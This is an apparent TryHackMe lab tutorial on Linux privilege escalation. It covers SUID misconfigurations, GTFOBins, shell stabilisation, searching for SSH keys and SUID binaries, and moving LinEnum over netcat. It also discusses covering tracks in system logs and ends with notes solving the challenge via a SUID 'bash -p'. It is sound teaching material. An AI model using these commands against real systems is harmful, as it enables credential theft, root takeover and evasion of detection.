
## 11.2. Today's Learning Objectives:

We're going to be learning the fundamentals of privilege escalation, what it entails and how it is used day-to-day without you even realising in legitimate circumstances. After covering the fundamentals of Linux file permissions and understanding why we may want to escalate our privileges as a pentester, we're going to put our theory into practice by abusing a common file permission misconfiguration on Linux.

Made with ❤ by [CMNatic](https://tryhackme.com/p/cmnatic)

---

### 11.3. What is Privilege Escalation?

You may be surprised to find out that privilege escalation is something that you do daily. On computing systems, there is a general rule of thumb that determines how someone interacts with a computer system and the resources within it. There are two primary levels of permissions that a person may have to a computer system:

- User
- Administrator

Generally speaking, only Administrators can modify system settings or change the permissions of other users resources like files and folders.

Users may be further divided into roles such as within a company. Staff in HR are only able to access HR documents whereas accounting staff are only able to access accounting resources.

Privilege escalation is _simply_ the process of increasing the current privileges we have to permissions above us. In the screenshot below, we are escalating our privileges to Administrator to run Command prompt on Windows 10:

![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img1.png)

_A normal process of privilege escalation_

As a pentester, we often want to escalate our privileges to that of another user or administrator to have full access to a system. We can discover and abuse misconfigurations or bugs within a system to escalate these privileges where this shouldn't be possible otherwise.  
  

## 11.4. The directions of privilege escalation

The process of escalating privileges isn't as clear-cut as going straight from a user through to administrator in most cases. Rather, slowly working our way through the resources and functions that other users can interact with.  
  

### 11.4.1. Horizontal Privilege Escalation:

A horizontal privilege escalation attack involves using the intended permissions of a user to abuse a vulnerability to access another user's resources who has similar permissions to you. For example, using an account with access to accounting documents to access a HR account to retrieve HR documents. As the difference in the permissions of both the Accounting and HR accounts is the data they can access, you aren't moving your privileges upwards.  
  

### 11.4.2. Vertical Privilege Escalation:

A bit more traditional, a vertical privilege escalation attack involves exploiting a vulnerability that allows you to perform actions like commands or accessing data acting as a higher privileged account such as an administrator.

Remember the attack you performed on "_Day 1 - A Christmas Crisis_"? You modified your cookie to access Santa's control panel. This is a fantastic example of a vertical privilege escalation because you were able to use your user account to access and manage the control panel. This control panel is only accessible by Santa (an administrator), so you are moving your permissions upwards in this sense.  
  

## 11.5. Reinforcing the Breach

A common issue you will face in offensive pentesting is instability. The very nature of some exploits relies on a heavy hand of luck and patience to work. Take for example the Eternalblue exploit which conducts a series of vulnerabilities in how the Windows OS allocates and manages memory. As the exploit writes to memory in an in-proper way, there is a chance of the computer crashing. We'll showcase a means of stabilising our connection in the section below.

Let's exploit a local copy of a [DVWA (Damn Vulnerable Web App)](http://www.dvwa.co.uk/) and use a vulnerability called command injection to create a reverse connection to our device. Highlighted in red is the system command to utilise Netcat to connect back to our attacking machine:

![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img2.png)

Verifying a successful reverse connection, we execute two initial commands to get a bit of insight as to how we should progress:

![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img3.png)

Executing the `whoami` command allows us to see what the name of the account that we are executing commands as. `echo $0` informs us of our shell - it is currently a `/bin/sh`. This is a simple shell in comparison to a "/bin/bash". In shells like our current Netcat, we don't have many luxuries such as tab-completion and re-selecting the last command executed (using the up-arrow), but importantly, we can't use commands that ask for additional input i.e. providing SSH credentials or using the substitute user command `su`

Modern Ubuntu installs come with python3 installed, we can spawn another shell and begin to make it interactive:  
`python -c 'import pty; pty.spawn("/bin/bash")'`

![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img4.png)  
There are [many ways you can make your shell interactive](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys) if Python is not installed.  
  

## 11.6. You Thought Enumeration Stopped at Nmap?

Wrong! We were just getting started. After gaining initial access, it's essential to begin to build a picture of the internals of the machine. We can look for a plethora of information such as other services that are running, sensitive data including passwords, executable scripts of binaries to abuse and more!

For example, we can use the find command to search for common folders or files that we may suspect to be on the machine:

- backups
- password
- admin
- config

Our vulnerable machine in this example has a directory called backups containing an SSH key that we can use for authentication. This was found via: `find / -name id_rsa 2> /dev/null`....Let's break this down:

- We're using `find` to search the volume, by specifying the root (`/`) to search for files named "id_rsa" which is the name for _private_ SSH keys, and then using `2> /dev/null` to only show matches to us.

Can you think of any other files or folders we may want to _find_?  
  

## 11.7. The "Priv Esc Checklist"

As you progress through your pentesting journey, you will begin to pick up a certain workflow for how you approach certain stages of an engagement. Whilst this workflow is truly yours, it will revolve around some fundamental steps in looking for vulnerabilities for privilege escalation.

1. Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
2. Locating other services running or applications installed that may be abusable (SUID & out of date software)
3. Looking for automated scripts like backup scripts (exploiting crontabs)
4. Credentials (user accounts, application config files..)
5. Mis-configured file and directory permissions

Checkout some checklists that can be used as a cheatsheet for the enumeration stage of privilege escalation:

- [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation)
- [payatu](https://payatu.com/guide-linux-privilege-escalation)
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md#linux---privilege-escalation)

## 11.8. Vulnerability: SUID 101

For today's material, we're going to be showcasing the resource that is [GTFOBins](https://gtfobins.github.io/) and explaining how the misconfigured permissions of applications can be exploited to escalate our privileges to an administrator.

Firstly, this begs the question...what is SUID exactly? Well, let's get on the same page by detailing how permissions work in Linux exactly. A benefit of Linux is its granularity in file permissions - they are, however, rather intimidating to approach. When performing commands like `ls -l` to list the permissions of our current directory:

![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img5.png)

```
   [A]         [B]     [C]drwxrwxr-x 2 cmnatic cmnatic 4096 Dec 8 18:33 exampledir drwxrwxr-x 2 cmnatic cmnatic 4096 Dec 8 18:33 exampledir2 drwxrwxr-x 2 cmnatic cmnatic 4096 Dec 8 18:33 exampledir3 -rw-rw-r-- 1 cmnatic cmnatic 0 Dec 8 18:33 examplefile -rw-rw-r-- 1 cmnatic cmnatic 0 Dec 8 18:33 examplefile2 -rw-rw-r-- 1 cmnatic cmnatic 0 Dec 8 18:33 examplefile3
```

Our directory has three directories "exampledir[3]" and three files "examplefile[3]". I've listed the four columns of interest here:

|   |   |   |
|---|---|---|
|Column Letter|Description|Example|
|[A]|filetype (`d` is a directory `-` is a file) and the user and group permissions "r" for reading, "w" for write and "x" for executing.|A file with `-rw-rw-r--` is read/write to the user and group only. However, every other user has read access only|
|[B]|the user who owns the file|cmnatic (system user)|
|[C]|the group (of users) who owns the file|sudoers group|

  
At the moment, the "examplefiles" are not executable as there is no "x" present for either the user or group. When setting the executable permission (`chmod +x filename`), this value changes (note the "x" in the snippet below -rwxrwxr):

```
-rwxrwxr-x 1 cmnatic cmnatic 0 Dec 8 18:43 backup.sh 
```

Normally, executables and commands (commands are just shortcuts to executables) will execute as the user who is running them (assuming they have the file permissions to do so.) This is why some commands such as changing a user's password require `sudo` in front of them. The `sudo` allows you to execute something with the permissions as root (the most privileged user). Users who can use `sudo` are called "sudoers" and are listed in `/etc/sudoers` (we can use this to help identify valuable users to us).

SUID is simply a permission added to an executable that does a similar thing as sudo. However, instead, allows users to run the executable as whoever owns it as demonstrated below:

|||||
|---|---|---|---|
||||\|   \|   \|   \|   \|<br>\|---\|---\|---\|---\|<br>\|Filename\|File Owner\|User who is executing the file\|User that the file is executed as\|<br>\|ex1\|root\|cmnatic\|root\|<br>\|ex2\|cmnatic\|cmnatic\|cmnatic\|<br>\|ex3\|service\|danny\|service\||

Suddenly with the introduction of SUID, users no longer have to be a sudoer to run an executable as root. This can be legitimately used to allow applications that specific privileges to run that another user can't have.  
  

## 11.9. Abusing SUID (GTFOBins)

Now that we understand why executables with this SUID permission are so enticing, let's begin to learn how to find these and understand the capabilities we can do with some of these executables. At the surface, SUID isn't inherently insecure. It's only when you factor in the misconfiguration of permissions (and given the complexity on Linux - is very easy to do); Administrators don't adhere to the rule of least privileges when troubleshooting.

Executables that are capable of interacting with the operating system such as reading/writing files or creating shells are goldmines for us. Thankfully, [GTFOBins is a website](https://gtfobins.github.io/) that lists a majority of applications that do such actions for us. Let's set the SUID on the `cp` command that is used to copy files with `chmod u+s /usr/bin/cp`

![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img6.png)

Note how the `cp` executable is owned by "root" and now has the SUID permission set:

`cmnatic@docker-ubuntu-s-1vcpu-1gb-lon1-01:~$ **ls -al /usr/bin** | grep "**cp**"   -rwsr-xr-x 1 root root 153976 Sep 5 2019 **cp**`

The `cp` command will now be executed as root - meaning we can copy any file on the system. Some locations may be of interest to us:

- copying the contents of other user directories (i.e. bash history, ssh keys, user.txt)
- copying the contents of the "/root" directory (i.e. "/root/flag.txt")
- copy the "/etc/passwd" & "/etc/shadow" files for password cracking

Let's confirm this by using find to search the machine for executables with the SUID permission set: `find / -perm -u=s -type f 2>/dev/null`

![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img8.png)

And now using `cp` to copy the contents of "/root" into our directory ("/home/cmnatic"):  
![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img9.png)  
  

## 11.10. Introducing Enumeration Scripts (Doing the leg work for us...)

Fortunately for us, there are many enumeration scripts available to use that automate some of the enumeration processes for us. We can download these onto our own machine and use a few methods to upload them to our vulnerable target instance. Bear in mind that vulnerable target Instances that you deploy on TryHackMe do not have internet access, so we must use our own attacking machine that is connected to the THM network.

A great script that is essential to anyone's toolkit is "LinEnum" that is available for download from [here](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh). _LinEnum_ enumerates the target machine for us, detailing and collating useful information such as kernel versions, permissions to any executables or files that are outside of the users home directory - and a whole plethora more!

The problem with this? It's easy to get lost within it all. Enumeration scripts often return lots of information that is often not all that useful to us; It's important to understand how these enumeration scripts work so as not to rely on them. However, these scripts make privilege escalation that much more approachable for beginners.

11.10.1. Let's download the [LinEnum](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh) script to our own machine using `wget`:  
![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e1.png)

11.10.2. Let's use Python3 to turn our machine into a web server to serve the _LinEnum.sh_ script to be downloaded onto the target machine. Make sure you run this command in the same directory that you downloaded _LinEnum.sh_ to: `python3 -m http.server 8080`  
![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e2.png)

![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e3.png)

11.10.3. We need to upload this to the vulnerable Instance (10.10.18.158) whilst ensuring that our own device is connected to the THM network. There are many ways this can be done which will depend on the vulnerable Instance you are attacking; the vulnerable Instance may not have tools such as `wget`, so alternatives will need to be used.

11.10.3.1. Navigate to a directory that we will have write permission to. The `/tmp` directory allows all users to write to it - so we will use this.

11.10.3.2. Using `wget` on the vulnerable Instance:  
![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e4.png)

11.10.3.3. Using `netcat`:

11.10.3.3.1. Setup netcat on the vulnerable Instance to listen for an incoming file: `nc -l -p 1337 > LinEnum.sh`  
![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e6.png)

11.10.3.3.2. Setup netcat on our own machine to send a file: `nc -w -3 10.10.18.158 1337 < LinEnum.sh`  
![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e7.png)

11.10.3.4. Add the execution permission to _LinEnum.sh_ on the vulnerable Instance: `chmod +x LinEnum.sh`

11.10.3.5. Execute _LinEnum.sh_ on the vulnerable Instance: `./LinEnum.sh`  
![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/e5.png)  
  

## 11.11. Covering our Tracks

The final stages of penetration testing involve setting up persistence and covering our tracks. For today's material, we'll detail the later as this is not mentioned nearly enough.

During a pentesting engagement, you will want to try to avoid detection from the administrators & engineers of your client wherever within the permitted scope of the pentesting engagement. Activities such as logging in, authentication and uploading/downloading files are logged by services and the system itself.

On Debian and Ubuntu, the majority of these are left within the "/var/log directory and often require administrative privileges to read and modify. Some log files of interest:

- "/var/log/auth.log" (Attempted logins for SSH, changes too or logging in as system users:)

![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img10.png)

- "/var/log/syslog" (System events such as firewall alerts:)

![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img11.png)

- "/var/log/<service/"
- For example, the access logs of apache2
    - /var/log/apache2/access.log"  
        ![](https://assets.tryhackme.com/additional/cmn-aoc2020/day-12/img12.png)

## 11.12. Challenge

Ensure that you have deployed the instance attached to this task and take note of the IP address (10.10.18.158). Answer Question #1 and #2 before proceeding to log into the vulnerable instance. You have already been provided with the credentials to use to log into the vulnerable instance in Question #3.

Apply your newly found knowledge from this task to escalate your privileges! Study the hints carefully if needed - everything to complete this day has been discussed throughout today's task.

Want to hone-in your skills? I highly recommend checking out the new "[Privilege escalation and shells](https://tryhackme.com/module/privilege-escalation-and-shells)" module on TryHackMe. [Modules](https://tryhackme.com/hacktivities) provide a guided-style of learning for all users, similarly to the [subscriber Pathways](https://tryhackme.com/paths)


finding: find / -perm -u=s -type f 2>/dev/null or use linpeas.sh/linenum.pl
got : /bin/bash as suid set
then use gtfobins guide to escalte
using bash -p where p is to run bash as privilege mode

